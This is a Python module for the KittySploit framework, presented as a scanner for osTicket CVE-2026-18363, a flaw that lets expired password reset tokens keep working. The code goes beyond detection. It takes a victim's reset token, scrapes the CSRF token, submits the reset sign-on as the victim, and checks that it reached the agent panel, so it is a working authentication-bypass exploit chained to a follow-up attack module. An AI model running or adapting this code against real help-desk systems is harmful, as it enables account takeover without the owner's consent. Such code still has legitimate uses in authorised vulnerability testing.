#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect osTicket CVE-2026-18363 expired password reset token acceptance."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "osTicket CVE-2026-18363 Reset Token Detect",
        "description": (
            "Detects CVE-2026-18363 in osTicket < 1.17.8 and 1.18.0–1.18.3: PasswordResetTokenBackend "
            "accepts reset tokens forever because the expiry check never runs for existing tokens. "
            "Requires a victim reset token (out-of-band)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-18363"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-18363",
            "https://www.cve.org/CVERecord?id=CVE-2026-18363",
        ],
        "modules": ["auxiliary/admin/http/osticket_cve_2026_18363_auth_bypass"],
        "tags": [
            "web",
            "scanner",
            "osticket",
            "auth-bypass",
            "password-reset",
            "cve-2026-18363",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["osticket"],
                "endpoint_pattern_any": ["/scp/pwreset.php"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "stale reset token"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/osticket_cve_2026_18363_auth_bypass",
                ],
            },
        },
    }

    port = OptPort(80, "osTicket HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    username = OptString("admin", "Victim agent username or email", False)
    token = OptString("", "48-char password reset token for the victim", True)

    def _csrf(self, html: str):
        match = re.search(r'__CSRFToken__["\']?\s+value=["\']([^"\']+)["\']', html or "")
        return match.group(1) if match else None

    def run(self):
        if not (self.token or "").strip():
            print_status("CVE-2026-18363 detect requires token")
            return False

        base = (self.path or "/").rstrip("/")
        bootstrap_path = f"{base}/scp/pwreset.php?token={self.token}" if base else f"/scp/pwreset.php?token={self.token}"

        try:
            response = self.http_request(
                method="GET",
                path=bootstrap_path,
                session=True,
                allow_redirects=False,
                timeout=int(self.timeout or 20),
            )
        except Exception as exc:
            print_status(f"CVE-2026-18363 probe failed: {exc.__class__.__name__}")
            return False

        if not response or response.status_code != 200:
            return False

        csrf = self._csrf(response.text or "")
        if not csrf:
            return False

        signon_path = f"{base}/scp/pwreset.php" if base else "/scp/pwreset.php"
        try:
            signon = self.http_request(
                method="POST",
                path=signon_path,
                data={
                    "__CSRFToken__": csrf,
                    "do": "newpasswd",
                    "token": self.token,
                    "userid": self.username,
                },
                session=True,
                allow_redirects=False,
                timeout=int(self.timeout or 20),
            )
        except Exception:
            return False

        if not signon or signon.status_code != 302:
            return False
        if "index.php" not in (signon.headers.get("Location") or ""):
            return False

        index_path = f"{base}/scp/index.php" if base else "/scp/index.php"
        try:
            panel = self.http_request(
                method="GET",
                path=index_path,
                session=True,
                allow_redirects=True,
                timeout=int(self.timeout or 20),
            )
        except Exception:
            return False

        body = (panel.text or "") if panel else ""
        markers = ("logout.php", "Agent Panel", "profile.php", "dashboard.php")
        if not any(marker in body for marker in markers) or "pwreset.php" in body[:800]:
            return False

        reason = f"CVE-2026-18363: authenticated as '{self.username}' with reset token"
        print_status(f"CVE-2026-18363 vuln=True user={self.username}")
        self.set_info(
            severity="critical",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-18363",
            path=signon_path,
            username=self.username,
        )
        return True
